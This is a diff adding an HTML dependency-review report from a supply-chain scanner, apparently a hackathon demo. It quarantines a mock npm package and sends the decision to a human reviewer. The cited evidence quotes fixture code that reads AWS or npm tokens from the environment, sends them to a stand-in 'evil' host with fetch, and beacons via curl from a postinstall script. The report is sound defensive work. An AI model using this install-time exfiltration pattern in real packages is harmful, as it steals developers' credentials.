@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Supply Chain Bouncer — Evidence & Review Report</title>
+  <style>
+    :root {
+      --bg: #0f172a;
+      --surface: #1e293b;
+      --surface-border: #334155;
+      --text: #f8fafc;
+      --text-muted: #94a3b8;
+      --accent-allow: #10b981;
+      --accent-quarantine: #f59e0b;
+      --accent-block: #ef4444;
+      --primary: #38bdf8;
+      --font: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: var(--font); background: var(--bg); color: var(--text); padding: 2rem; line-height: 1.5; }
+    .container { max-width: 1200px; margin: 0 auto; }
+    header { display: flex; justify-content: space-between; align-items: flex-start; border-bottom: 1px solid var(--surface-border); padding-bottom: 1.5rem; margin-bottom: 2rem; }
+    h1 { font-size: 1.75rem; font-weight: 700; color: var(--text); }
+    .subtitle { color: var(--text-muted); font-size: 0.9rem; margin-top: 0.25rem; }
+    .meta-badges { display: flex; gap: 0.5rem; flex-wrap: wrap; }
+    
+    .badge { display: inline-block; padding: 0.25rem 0.6rem; border-radius: 9999px; font-size: 0.75rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.05em; }
+    .badge-allow { background: rgba(16, 185, 129, 0.2); color: var(--accent-allow); border: 1px solid var(--accent-allow); }
+    .badge-quarantine { background: rgba(245, 158, 11, 0.2); color: var(--accent-quarantine); border: 1px solid var(--accent-quarantine); }
+    .badge-block { background: rgba(239, 68, 68, 0.2); color: var(--accent-block); border: 1px solid var(--accent-block); }
+    .badge-direct { background: rgba(56, 189, 248, 0.15); color: var(--primary); }
+    .badge-transitive { background: rgba(148, 163, 184, 0.15); color: var(--text-muted); }
+    .badge-change { background: var(--surface-border); color: var(--text); }
+    .badge-critical { background: rgba(239, 68, 68, 0.25); color: #fca5a5; }
+    .badge-high { background: rgba(249, 115, 22, 0.25); color: #fdba74; }
+    .badge-medium { background: rgba(245, 158, 11, 0.25); color: #fde68a; }
+    .badge-low { background: rgba(56, 189, 248, 0.2); color: #bae6fd; }
+
+    .banner { background: var(--surface); border: 2px solid var(--surface-border); border-radius: 0.75rem; padding: 1.5rem; margin-bottom: 2rem; display: flex; gap: 1.5rem; align-items: center; }
+    .banner.ALLOW { border-color: var(--accent-allow); }
+    .banner.QUARANTINE { border-color: var(--accent-quarantine); }
+    .banner.BLOCK { border-color: var(--accent-block); }
+    .verdict-tag { font-size: 1.75rem; font-weight: 800; padding: 0.75rem 1.5rem; border-radius: 0.5rem; text-align: center; }
+    .verdict-tag.ALLOW { background: var(--accent-allow); color: #000; }
+    .verdict-tag.QUARANTINE { background: var(--accent-quarantine); color: #000; }
+    .verdict-tag.BLOCK { background: var(--accent-block); color: #fff; }
+    
+    .reasons-box h3 { font-size: 1rem; margin-bottom: 0.5rem; color: var(--text); }
+    .reasons-box ul { margin-left: 1.25rem; font-size: 0.95rem; color: var(--text-muted); }
+    .reasons-box li { margin-bottom: 0.25rem; }
+
+    .section { background: var(--surface); border: 1px solid var(--surface-border); border-radius: 0.75rem; padding: 1.5rem; margin-bottom: 1.5rem; }
+    .section h2 { font-size: 1.15rem; font-weight: 700; margin-bottom: 1rem; border-bottom: 1px solid var(--surface-border); padding-bottom: 0.5rem; color: var(--primary); }
+
+    table { width: 100%; border-collapse: collapse; font-size: 0.875rem; }
+    th { text-align: left; padding: 0.75rem; border-bottom: 2px solid var(--surface-border); color: var(--text-muted); }
+    td { padding: 0.75rem; border-bottom: 1px solid var(--surface-border); }
+    tr:last-child td { border-bottom: none; }
+    
+    .card-item { background: rgba(15, 23, 42, 0.6); border: 1px solid var(--surface-border); border-radius: 0.5rem; padding: 1rem; margin-bottom: 0.75rem; border-left: 4px solid var(--text-muted); }
+    .card-item.sev-critical { border-left-color: var(--accent-block); }
+    .card-item.sev-high { border-left-color: #f97316; }
+    .card-item.sev-medium { border-left-color: var(--accent-quarantine); }
+    .item-header { display: flex; align-items: center; gap: 0.75rem; margin-bottom: 0.5rem; flex-wrap: wrap; }
+    .code-snippet { background: #000; padding: 0.75rem; border-radius: 0.35rem; font-size: 0.8rem; overflow-x: auto; margin-top: 0.5rem; color: #a5f3fc; }
+    .code-mono { font-family: monospace; font-size: 0.8rem; }
+    
+    .investigators-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 1rem; }
+    .investigator-card { background: rgba(15, 23, 42, 0.7); border: 1px solid var(--surface-border); border-radius: 0.5rem; padding: 1rem; }
+    .inv-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.75rem; border-bottom: 1px solid var(--surface-border); padding-bottom: 0.5rem; }
+    .finding-box { background: rgba(30, 41, 59, 0.7); padding: 0.75rem; border-radius: 0.35rem; margin-bottom: 0.5rem; font-size: 0.85rem; }
+    .finding-box p { margin-top: 0.25rem; }
+
+    .callout { padding: 1rem; border-radius: 0.5rem; border-left: 4px solid; margin-top: 0.5rem; font-size: 0.9rem; }
+    .callout-info { background: rgba(56, 189, 248, 0.1); border-left-color: var(--primary); }
+    .terminal-box { background: #000; border: 1px solid var(--surface-border); border-radius: 0.5rem; padding: 1rem; font-family: monospace; color: #4ade80; font-size: 0.875rem; margin-top: 0.5rem; overflow-x: auto; }
+    .text-sm { font-size: 0.75rem; }
+    .text-muted { color: var(--text-muted); }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <header>
+      <div>
+        <h1>Supply Chain Bouncer &mdash; Dependency Review</h1>
+        <p class="subtitle">Run ID: <code>run-1790507874694-oplu0p</code> &bull; Subject: <code>8c25337c586380ee...</code></p>
+      </div>
+      <div class="meta-badges">
+        <span class="badge badge-quarantine">QUARANTINE</span>
+        <span class="badge badge-change">MODE: FIXTURE</span>
+        <span class="badge badge-change">STATUS: COMPLETE</span>
+      </div>
+    </header>
+
+    <!-- 1. Recommendation & Top 3 Key Reasons -->
+    <div class="banner QUARANTINE">
+      <div class="verdict-tag QUARANTINE">
+        QUARANTINE
+      </div>
+      <div class="reasons-box">
+        <h3>Top Findings &amp; Recommendation Rationale</h3>
+        <ul><li>mock-telemetry-reporter (PROCESS_EXECUTION): Executes external system processes or shell commands at line 5: &quot;const { execSync } = require(&#39;child_process&#39;);&quot;</li><li>mock-telemetry-reporter (PROCESS_EXECUTION): Executes external system processes or shell commands at line 6: &quot;execSync(&quot;curl -s https://evil-telemetry.example.com/beacon&quot;);&quot;</li><li>mock-telemetry-reporter (LIFECYCLE_SCRIPT_ADDED): Newly introduced lifecycle script &quot;postinstall&quot;: &quot;node setup.js&quot;. Review installation behavior.</li></ul>
+      </div>
+    </div>
+
+    <!-- 2. Human Review & Decision Mechanism -->
+    <section class="section">
+      <h2>1. Human Review Decision Status</h2>
+      <p><strong>Current State:</strong> <span class="badge badge-quarantine">Awaiting human review</span></p>
+      <p class="text-muted" style="margin-top: 0.5rem;">To record an approved, quarantined, or blocked human decision against this exact input snapshot, run the review command in your terminal:</p>
+      <div class="terminal-box">node src/cli.mjs review --run &quot;E:\ibm hackathon project\supply-chain-bouncer\reports\demo\suspicious-fixture&quot; --interactive --mode trusted-local-demo</div>
+    </section>
+
+    <!-- 3. Packages Table -->
+    <section class="section">
+      <h2>2. Changed Dependencies (2 instances)</h2>
+      <div style="overflow-x: auto;">
+        <table>
+          <thead>
+            <tr>
+              <th>Package Name</th>
+              <th>Change</th>
+              <th>Direct/Transitive</th>
+              <th>Version Diff</th>
+              <th>Location</th>
+              <th>Install Script</th>
+              <th>Provenance Metadata</th>
+              <th>Integrity SRI</th>
+            </tr>
+          </thead>
+          <tbody>
+      <tr>
+        <td><strong>mock-telemetry-reporter</strong></td>
+        <td><span class="badge badge-change">ADDED</span></td>
+        <td><span class="badge badge-direct">DIRECT</span></td>
+        <td>none &rarr; <strong>1.0.0</strong></td>
+        <td><code>node_modules/mock-telemetry-reporter</code></td>
+        <td>⚠️ Yes</td>
+        <td>2026-09-01 (1 maintainers)</td>
+        <td><code class="code-mono">sha512-mockSuspiciousInt...</code></td>
+      </tr>
+    
+      <tr>
+        <td><strong>picocolors</strong></td>
+        <td><span class="badge badge-change">UNCHANGED</span></td>
+        <td><span class="badge badge-direct">DIRECT</span></td>
+        <td>1.1.1 &rarr; <strong>1.1.1</strong></td>
+        <td><code>node_modules/picocolors</code></td>
+        <td>No</td>
+        <td>N/A</td>
+        <td><code class="code-mono">sha512-xceH2snhtb5M9liqD...</code></td>
+      </tr>
+    </tbody>
+        </table>
+      </div>
+    </section>
+
+    <!-- 4. Investigator Results -->
+    
+      <section class="section">
+        <h2>4. Bob Investigator Results</h2>
+        <div class="callout callout-info">
+          <p><strong>Awaiting Bob Agent Review:</strong> Run the <code>supply-chain-bouncer</code> skill in Bob IDE against this evidence bundle to coordinate the Typosquat Detective, Provenance Auditor, and Behavior Analyst.</p>
+        </div>
+      </section>
+    
+
+    <!-- 5. Static Observations & Cited Evidence -->
+    <section class="section">
+      <h2>3. Deterministic Static Observations (6)</h2>
+      <div>
+          <div class="card-item sev-medium">
+            <div class="item-header">
+              <span class="badge badge-medium">MEDIUM</span>
+              <strong>mock-telemetry-reporter</strong> &mdash; <code>LIFECYCLE_SCRIPT_ADDED</code>
+              <span class="text-muted text-sm">package.json#scripts.postinstall</span>
+            </div>
+            <div class="item-body">
+              <p>Newly introduced lifecycle script &quot;postinstall&quot;: &quot;node setup.js&quot;. Review installation behavior.</p>
+              
+            </div>
+          </div>
+        
+          <div class="card-item sev-medium">
+            <div class="item-header">
+              <span class="badge badge-medium">MEDIUM</span>
+              <strong>mock-telemetry-reporter</strong> &mdash; <code>ENVIRONMENT_ACCESS</code>
+              <span class="text-muted text-sm">setup.js#L3</span>
+            </div>
+            <div class="item-body">
+              <p>References environment variables which may access sensitive credentials at line 3: &quot;const token = process.env.AWS_SECRET_ACCESS_KEY || process.env.NPM_TOKEN;&quot;</p>
+              
+            </div>
+          </div>
+        
+          <div class="card-item sev-medium">
+            <div class="item-header">
+              <span class="badge badge-medium">MEDIUM</span>
+              <strong>mock-telemetry-reporter</strong> &mdash; <code>NETWORK_OPERATION</code>
+              <span class="text-muted text-sm">setup.js#L4</span>
+            </div>
+            <div class="item-body">
+              <p>Initiates network or socket operations at line 4: &quot;fetch(&quot;https://evil-telemetry.example.com/exfil?token=&quot; + encodeURIComponent(token || &#39;none&#39;));&quot;</p>
+              
+            </div>
+          </div>
+        
+          <div class="card-item sev-medium">
+            <div class="item-header">
+              <span class="badge badge-medium">MEDIUM</span>
+              <strong>mock-telemetry-reporter</strong> &mdash; <code>NETWORK_OPERATION</code>
+              <span class="text-muted text-sm">setup.js#L6</span>
+            </div>
+            <div class="item-body">
+              <p>Initiates network or socket operations at line 6: &quot;execSync(&quot;curl -s https://evil-telemetry.example.com/beacon&quot;);&quot;</p>
+              
+            </div>
+          </div>
+        
+          <div class="card-item sev-high">
+            <div class="item-header">
+              <span class="badge badge-high">HIGH</span>
+              <strong>mock-telemetry-reporter</strong> &mdash; <code>PROCESS_EXECUTION</code>
+              <span class="text-muted text-sm">setup.js#L5</span>
+            </div>
+            <div class="item-body">
+              <p>Executes external system processes or shell commands at line 5: &quot;const { execSync } = require(&#39;child_process&#39;);&quot;</p>
+              
+            </div>
+          </div>
+        
+          <div class="card-item sev-high">
+            <div class="item-header">
+              <span class="badge badge-high">HIGH</span>
+              <strong>mock-telemetry-reporter</strong> &mdash; <code>PROCESS_EXECUTION</code>
+              <span class="text-muted text-sm">setup.js#L6</span>
+            </div>
+            <div class="item-body">
+              <p>Executes external system processes or shell commands at line 6: &quot;execSync(&quot;curl -s https://evil-telemetry.example.com/beacon&quot;);&quot;</p>
+              
+            </div>
+          </div>
+        </div>
+    </section>
+
+    <!-- 6. Unknowns & Coverage Limitations -->
+    <section class="section">
+      <h2>5. Coverage Limits &amp; Explicit Unknowns</h2>
+      <ul style="margin-left: 1.25rem; color: var(--text-muted); font-size: 0.9rem;"><li>Runtime dynamic effects were not executed or observed.</li><li>Full cryptographic npm provenance was not verified (adapter extension pending).</li></ul>
+    </section>
+
+    <!-- 7. Remediation Guidance -->
+    <section class="section">
+      <h2>6. Remediation &amp; Compatibility Guidance</h2>
+      <p style="font-size: 0.9rem; color: var(--text-muted);">
+        If a package is held under <strong>QUARANTINE</strong> or <strong>BLOCK</strong>:
+      </p>
+      <ul style="margin-left: 1.25rem; color: var(--text-muted); font-size: 0.9rem; margin-top: 0.5rem;">
+        <li><strong>Replace:</strong> Ask Bob to recommend a reviewed alternative package with matching functionality.</li>
+        <li><strong>Rollback:</strong> Remove the dependency declaration and revert lockfile changes with scripts disabled.</li>
+        <li><strong>Approve with Rationale:</strong> If the lifecycle script or observation is expected (e.g. native compilation), record an ALLOW decision citing the benign explanation.</li>
+      </ul>
+    </section>
+  </div>
+</body>
+</html>
